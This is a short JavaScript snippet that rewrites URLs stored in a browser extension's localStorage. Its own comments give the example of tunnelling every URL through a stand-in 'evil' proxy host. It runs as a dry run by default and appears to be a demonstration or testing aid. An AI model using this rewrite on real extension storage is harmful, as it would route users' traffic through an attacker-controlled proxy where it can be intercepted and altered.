// search&replace in extension local storage

// eg. tunnel all URLs through http://evil proxy

var search = /(?:[^!]|^)(http[^\s"]+)/g;
// search for http[s]:// URLs not preceeded by !
var replace = "HTTP:\/\/evil/tunnel/!$1";
// prepend with 'HTTP://evil/tunnel/!'

var dry_run = true;

for (var replaces={},item=key=replaced='',i=0; i < localStorage.length; i++) {
  key = localStorage.key(i);
  item = localStorage.getItem(key);    
  if (localStorage.getItem(key).match(search)) {
    replaces[key] = [];
    replaces[key].push(item);
    replaced = item.replace(search,replace);
    replaces[key].push(replaced);
    if (!dry_run) {
      localStorage.setItem(key, replaced);
    }
  }
}
replaces;